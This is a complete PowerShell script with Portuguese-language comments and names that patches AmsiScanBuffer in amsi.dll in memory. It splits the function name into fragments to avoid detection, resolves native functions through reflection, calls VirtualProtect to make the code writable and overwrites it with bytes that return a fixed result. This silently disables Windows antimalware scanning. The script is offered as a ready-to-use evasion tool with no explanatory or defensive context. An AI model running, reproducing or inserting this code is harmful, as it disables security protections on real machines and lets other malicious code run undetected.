# Verifica se o script foi chamado com o parâmetro -iniciar
param (
    [string]$argumento
)

if ($argumento -ne "-iniciar") {
    Write-Host "Comando inválido. O script deve ser chamado com o argumento '-iniciar'."
    exit
}

function ObterEnderecoFuncao {
    Param ($nomeModulo, $nomeFuncao)
    $assemblies = ([AppDomain]::CurrentDomain.GetAssemblies() |
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
     Equals('System.dll')
     }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $resultado=@()
    $assemblies.GetMethods() | ForEach-Object {If($_.Name -like "Ge*P*oc*ddress") {$resultado+=$_}}
    return $resultado[0].Invoke($null, @(($assemblies.GetMethod('GetModuleHandle')).Invoke($null,
@($nomeModulo)), $nomeFuncao))
}

function CriarTipoDelegado {
    Param (
     [Parameter(Position = 0, Mandatory = $True)] [Type[]]
     $funcao, [Parameter(Position = 1)] [Type] $tipoDelegado = [Void]
    )
    $tipo = [AppDomain]::CurrentDomain.
    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
[System.Reflection.Emit.AssemblyBuilderAccess]::Run).
    DefineDynamicModule('ModuloEmMemoria', $false).
    DefineType('TipoDeDelegado', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])

    $tipo.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $funcao).
    SetImplementationFlags('Runtime, Managed')

    $tipo.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $tipoDelegado, $funcao).SetImplementationFlags('Runtime, Managed')
    return $tipo.CreateType()
}

# Inicia a execução do código principal após a verificação do comando
$parte1="A"
$parte2="msiS"
$parte3="canB"
$parte4="uffer"
[IntPtr]$enderecoFuncao = ObterEnderecoFuncao "amsi.dll" ($parte1+$parte2+$parte3+$parte4)
$protecaoAntiga = 0
$chamadaProtecaoVirtual=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((ObterEnderecoFuncao "kernel32.dll" "VirtualProtect"), (CriarTipoDelegado @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))

$chamadaProtecaoVirtual.Invoke($enderecoFuncao, 3, 0x40, [ref]$protecaoAntiga)
$buffer = [Byte[]] (0xb8,0x34,0x12,0x07,0x80,0x66,0xb8,0x32,0x00,0xb0,0x57,0xc3)
[System.Runtime.InteropServices.Marshal]::Copy($buffer, 0, $enderecoFuncao, 12)
